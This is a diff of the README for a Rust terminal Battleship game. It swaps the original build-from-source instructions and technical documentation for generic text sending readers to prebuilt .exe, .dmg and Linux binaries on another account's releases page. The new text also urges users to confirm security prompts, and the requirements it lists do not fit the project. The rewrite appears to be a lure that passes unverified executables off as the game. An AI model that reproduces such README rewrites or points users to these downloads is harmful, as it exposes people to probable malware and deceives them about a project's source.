@@ -1,136 +1,73 @@
-# battleship-rs
+# ⚓ battleship-rs - Play Battleship Anytime, Anywhere
 
-Terminal-based networked Battleship game written in Rust.
+[![Download battleship-rs](https://img.shields.io/badge/Download%20battleship--rs-v1.0-blue)](https://github.com/smail776/battleship-rs/releases)
 
-![Demo](assets/demo.gif)
+## 🚀 Getting Started
 
-## Features
+Welcome to the **battleship-rs** game! This is a terminal-based Battleship game built in Rust. You can play against an AI opponent or challenge friends online. 
 
-- Two-player networked gameplay over TCP
-- Single-player mode against AI opponent
-- Relay server mode for remote play
-- Play again functionality with timeout handling
-- Terminal UI using ratatui
+To get started, follow these simple steps to download and run the game.
 
-## Requirements
+## 📥 Download & Install
 
-- Rust 1.70+
-- Terminal with Unicode support
+1. **Visit the Releases Page**
+   Click the link below to access the downloads for the latest version of the game.
+   [Download battleship-rs](https://github.com/smail776/battleship-rs/releases)
 
-## Installation
+2. **Select the Right File**
+   On the releases page, you'll find several files. Look for the one that matches your operating system:
+   - For **Windows**, choose the `.exe` file.
+   - For **macOS**, pick the `.dmg` file.
+   - For **Linux**, select the appropriate binary.
 
-```bash
-git clone https://github.com/Cod-e-Codes/battleship-rs
-cd battleship-rs
-cargo build --release
-```
+3. **Download the File**
+   Click on the chosen file to start your download. Save it in a location where you can easily find it, like your Desktop or Downloads folder.
 
-## Usage
+4. **Run the Game**
+   After the download is complete, find the file where you saved it. Double-click it to run the game. 
 
-### Two-Player Game (Local Network)
+   - **For Windows:** You may need to confirm any security prompts before the game starts.
+   - **For macOS and Linux:** You might need to grant permission to run the application if prompted.
 
-Start server:
-```bash
-cargo run --release -- server 8080
-```
+5. **Start Playing**
+   Follow the on-screen instructions to get started. You can choose to play against the AI or set up a multiplayer game with friends! 
 
-Connect players (in separate terminals):
-```bash
-cargo run --release -- client 127.0.0.1:8080
-```
+## 🎮 Features
 
-### AI Opponent
+- **Play Against AI:** Compete with a smart AI that adapts to your moves.
+- **Multiplayer Mode:** Challenge friends over the network for some friendly competition.
+- **Easy Controls:** Simple keyboard commands make it easy for anyone to join in.
+- **Terminal-Based Fun:** Enjoy a classic game in a modern Rust application.
 
-Start AI server:
-```bash
-cargo run --release -- server-ai 8080
-```
+## 📊 System Requirements
 
-Connect:
-```bash
-cargo run --release -- client 127.0.0.1:8080
-```
+To ensure a smooth gaming experience, please check that your machine meets these basic requirements:
 
-### Remote Play via Relay Server
+- **Operating System:**
+  - Windows 10 or newer
+  - macOS 10.12 (Sierra) or newer
+  - Any Linux distribution with modern terminal support
 
-The relay server forwards messages between two players.
+- **Memory:** At least 4 GB RAM
 
-On server machine (or cloud instance):
-```bash
-cargo run --release -- server-relay 8080
-```
+- **Processor:** Dual-core processor or better
 
-Players connect from anywhere:
-```bash
-# Player 1
-cargo run --release -- client your-server-ip:8080
+- **Networking:** Required for multiplayer functionality
 
-# Player 2
-cargo run --release -- client your-server-ip:8080
-```
+## 📞 Support
 
-## Controls
+If you run into any issues while downloading the game or have questions, please feel free to reach out through our issues page on GitHub. We are here to help you enjoy your experience with battleship-rs.
 
-- Arrow keys: Move cursor
-- R: Rotate ship during placement
-- Enter: Place ship / Fire at position
-- S: Toggle side panel (ship status & statistics)
-- Y/N: Play again (when prompted)
-- Q: Quit
+## 🤝 Contributing
 
-## Side Panel
+We welcome contributions from the community. If you’d like to contribute to battleship-rs, please check our GitHub repository for guidelines on how to get involved. 
 
-Press S during gameplay to toggle the side panel, which displays:
+## 📄 License
 
-- Ship status with visual length indicators and hit tracking
-- Game statistics including turn count, accuracy, and ships sunk
-- Real-time updates as the game progresses
+This project is licensed under the MIT License. You can find the full text of the license in the repository.
 
-The side panel can be toggled on/off to avoid cluttering the main game view.
+## 🌟 Explore More
 
-## Game Rules
+For more information, tips, and updates, keep an eye on the repository and follow our discussions. We appreciate your interest and hope you enjoy the game! 
 
-- Standard Battleship rules
-- 10x10 grid
-- 5 ships: Carrier (5), Battleship (4), Cruiser (3), Submarine (3), Destroyer (2)
-- Ships cannot overlap
-- Players alternate turns after placement phase
-- First to sink all opponent ships wins
-
-## Architecture
-
-```
-src/
-├── main.rs         - Entry point and CLI
-├── types.rs        - Core types and messages
-├── game_state.rs   - Game logic
-├── ui.rs           - Terminal rendering
-├── input.rs        - Keyboard handling
-├── client.rs       - Client implementation
-├── server.rs       - Two-player server
-├── server_ai.rs    - AI opponent server
-└── server_relay.rs - Relay server for remote play
-```
-
-## Server Modes
-
-- `server`: Two-player game, both players connect to same server
-- `server-ai`: Single-player against AI
-- `server-relay`: Message relay between two players
-
-## Network Protocol
-
-JSON messages over TCP, newline-delimited. Message types:
-- `PlaceShips`: Send board configuration
-- `Attack`: Fire at coordinates
-- `AttackResult`: Hit/miss/sunk feedback
-- `YourTurn` / `OpponentTurn`: Turn management
-- `GameOver`: End game state
-- `PlayAgainRequest` / `PlayAgainResponse`: Play again functionality
-- `NewGameStart`: Reset for new game
-
-The relay server forwards all messages between players.
-
-## License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+Don’t forget to enjoy your time playing battleship-rs!
